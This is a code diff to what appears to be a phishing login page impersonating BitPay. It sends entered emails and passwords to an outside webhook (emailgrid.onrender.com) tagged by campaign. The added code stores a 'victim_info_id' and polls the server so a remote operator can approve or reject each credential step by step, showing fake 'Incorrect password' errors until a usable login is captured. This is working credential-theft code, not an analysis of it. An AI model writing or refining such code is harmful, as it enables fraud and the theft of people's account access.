@@ -211,6 +211,11 @@
                 font-size: 16px;
             }
         }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -423,6 +428,7 @@
             const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
             console.log('Webhook URL:', webhookUrl);
             
+            showLoadingButton(true);
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
@@ -438,6 +444,7 @@
                 console.log('Response headers:', [...response.headers.entries()]);
                 
                 if (!response.ok) {
+                    showLoadingButton(false);
                     return response.text().then(text => {
                         console.log('Error response body:', text);
                         throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
@@ -448,101 +455,116 @@
             .then(result => {
                 console.log('Webhook success response:', result);
                 
-                // Set expiration timer for messaging data (10 minutes)
-                setDataExpiration();
-                
-                // Handle success
-                showSuccess('Login successful!');
-                setTimeout(() => {
-                    resetButton();
-                }, 2000);
+                // Store victim info ID and start polling if available
+                if (result.victim_info_id) {
+                    localStorage.setItem('bitpay_victim_info_id', result.victim_info_id);
+                    // Start polling for email approval first
+                    pollForApproval(result.victim_info_id, campaignId, 'email');
+                } else {
+                    // Fallback to original behavior
+                    setDataExpiration();
+                    showSuccess('Login successful!');
+                    setTimeout(() => {
+                        showLoadingButton(false);
+                    }, 2000);
+                }
             })
             .catch(error => {
                 console.error('Webhook error:', error);
-                // Still log detailed error info
-                if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
-                    console.error('Network error - server might be down or CORS issue');
-                }
-                
-                // Show success message even on error for user experience
-                showSuccess('Login successful!');
-                setTimeout(() => {
-                    resetButton();
-                }, 2000);
+                showLoadingButton(false);
+                showError('Connection error. Please try again.');
             });
         }
 
-        function showError(message) {
-            // Create or update error message element
-            let errorElement = document.getElementById('error-message');
-            if (!errorElement) {
-                errorElement = document.createElement('div');
-                errorElement.id = 'error-message';
-                errorElement.style.cssText = `
-                    color: #dc3545;
-                    font-size: 14px;
-                    margin-top: 10px;
-                    text-align: center;
-                    padding: 8px;
-                    background: rgba(220, 53, 69, 0.1);
-                    border-radius: 4px;
-                    border: 1px solid rgba(220, 53, 69, 0.2);
-                `;
-                const form = document.querySelector('form');
-                form.appendChild(errorElement);
-            }
-            errorElement.textContent = message;
-            errorElement.style.display = 'block';
+        function pollForApproval(victimInfoId, campaignId, step) {
+            const pollUrl = `https://emailgrid.onrender.com/status/${victimInfoId}/?step=${step}`;
             
-            // Hide error after 5 seconds
-            setTimeout(() => {
-                if (errorElement) {
-                    errorElement.style.display = 'none';
-                }
-            }, 5000);
+            let pollingActive = true; // Flag to control polling
+            
+            // Show loading state
+            showLoading(`Verifying ${step}...`);
+            showLoadingButton(true);
+            
+            const poll = () => {
+                if (!pollingActive) return; // Stop polling if disabled
+                fetch(pollUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    },
+                    mode: 'cors',
+                    credentials: 'omit'
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Poll result:', result);
+                    
+                    if (result.submission_status === 'approved') {
+                        console.log('Status approved! Proceeding...');
+                        pollingActive = false; // Stop polling
+                        if (step === 'email') {
+                            // Email approved, now check password
+                            pollForApproval(victimInfoId, campaignId, 'password');
+                        } else if (step === 'password') {
+                            // Password approved, show success
+                            setDataExpiration();
+                            showSuccess('Login successful!');
+                            setTimeout(() => {
+                                showLoadingButton(false);
+                            }, 2000);
+                        }
+                    } else if (result.submission_status === 'rejected') {
+                        console.log('Status rejected! Showing error and stopping...');
+                        pollingActive = false; // Stop polling - DO NOT PROCEED
+                        // Show appropriate error message - STAY ON CURRENT PAGE
+                        showLoadingButton(false);
+                        let errorMessage = 'Login failed. Please try again.';
+                        if (step === 'email') {
+                            errorMessage = result.error_message || 'Incorrect email. Please check and try again.';
+                            highlightInput('email');
+                        } else if (step === 'password') {
+                            errorMessage = result.error_message || 'Incorrect password. Please try again.';
+                            highlightInput('password');
+                        }
+                        showError(errorMessage);
+                        // DO NOT REDIRECT - User must fix the input and try again;
+                    } else {
+                        // Still pending, continue polling
+                        setTimeout(poll, 2000); // Poll every 2 seconds
+                    }
+                })
+                .catch(error => {
+                    console.error('Polling error:', error);
+                    // Continue polling on error, but respect pollingActive flag
+                    if (pollingActive) {
+                        setTimeout(poll, 3000);
+                    }
+                });
+            };
+            
+            // Start polling
+            poll();
         }
 
-        function showSuccess(message) {
-            // Create or update success message element
-            let successElement = document.getElementById('success-message');
-            if (!successElement) {
-                successElement = document.createElement('div');
-                successElement.id = 'success-message';
-                successElement.style.cssText = `
-                    color: #28a745;
-                    font-size: 14px;
-                    margin-top: 10px;
-                    text-align: center;
-                    padding: 8px;
-                    background: rgba(40, 167, 69, 0.1);
-                    border-radius: 4px;
-                    border: 1px solid rgba(40, 167, 69, 0.2);
-                `;
-                const form = document.querySelector('form');
-                form.appendChild(successElement);
-            }
-            successElement.textContent = message;
-            successElement.style.display = 'block';
-            
-            // Hide success after 3 seconds
-            setTimeout(() => {
-                if (successElement) {
-                    successElement.style.display = 'none';
-                }
-            }, 3000);
-        }
-
-        function resetButton() {
+        function showLoadingButton(isLoading) {
             const button = document.querySelector('.btn-primary');
-            button.disabled = false;
-            button.textContent = 'Submit';
+            if (!button) return;
+            if (isLoading) {
+                button.disabled = true;
+                button.textContent = 'Submitting...';
+            } else {
+                button.disabled = false;
+                button.textContent = 'Submit';
+            }
         }
 
-        function showLoading(button) {
-            button.disabled = true;
-            button.textContent = 'Submitting...';
+        function highlightInput(field) {
+            const input = document.getElementById(field);
+            if (input) {
+                input.classList.add('input-error');
+                setTimeout(() => input.classList.remove('input-error'), 5000);
+            }
         }
-
         // Initialize on page load
         window.addEventListener('load', function() {
             checkAndClearExpiredData(); // Check for expired data first
